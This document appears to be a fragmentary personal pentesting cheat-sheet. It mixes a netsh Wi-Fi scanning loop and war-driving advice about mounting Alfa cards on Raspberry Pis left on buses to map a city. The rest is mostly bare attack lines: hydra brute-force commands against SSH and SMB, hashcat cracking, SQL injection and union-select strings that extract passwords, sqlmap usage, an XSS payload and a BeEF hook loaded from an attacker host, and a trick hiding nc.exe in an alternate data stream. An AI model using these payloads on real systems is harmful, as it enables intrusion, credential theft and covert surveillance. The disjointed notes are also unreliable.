If you don't have a USB Wi-Fi adapter you can still conduct a Wi-Fi assessment scan using the built-in netsh tool on your host Windows operating system.
First, disconnect your host system from a wireless network (if you are already connected).
Next, open a Command Prompt on your host Windows system. Run the command shown below to perform the following actions:

FOR /L %N IN () DO @netsh wlan show networks mode=bssid | findstr "^SSID Signal" && ping -n 16 127.0.0.1 >NUL && cls



With WiFi, an Alfa cards are my favorite to use, plug into your computer --> lovely.  Fun fact, the default antennae that come with Alfa card are 5dbi I think.
I've been quite successful adding a better antennae, say 12dbi e.g. (4-Pack 12dBi 2.4GHz WiFi Antenna with RP-SMA Connector for WiFi Router Booster on amazon) pretty inexpensive to greatly increase your range.
Then you can even put these on raspberrypi's, attach portable battery packs, place on buses or mass transport, and you can well map a crowded city very nicely :-).


OnlinePasswordGuessing

hydra -l <user> -P passwords.txt ssh://10.10.75.1
hydra -l <user> -P passwords.txt smb://10.10.75.1
hydra -L user.txt -p <password> ssh://10.10.75.1

hashcat -m <typeofhash> -a <attackmode> -o <outputfile> -r <rulesfile> <hashfile> <wordslistfile> 
hashcat64.exe -a 0 -m 0 -o OUTPUT2.txt -r rules\Incisive-leetspeak.rule MD5.txt password.lst

' or 1=1; --

Rules for Sqlmap:
1:38
1. Always use a valid URL (never a url that returns an error)
1:38
2. Always put the URL in "quotes"

http://testphp.vulnweb.com/
sqlmap -u "<url>" 
sqlmap -u "<url>" --dbs


<script>alert(1);</script>
<script src=http://attackerip:3000/beef/hook.js" />


select <field> from <table> where variable = '<value>';
select * from users where variable = '<value>';
select * from users where variable = 'fred';
' or '1'='1
SELECT * FROM users WHERE username='' OR '1'='1';
NOUSER' union select username, password from users where username !='
SELECT * FROM users WHERE username='NOUSER' union select username, password from users where username !=''


MarkDown
:. From the Current line
.,$ s/.*/+ `&`: 

more < test.txt:nc.exe > nc.exe

copy <file> \\?\c:\demo\CON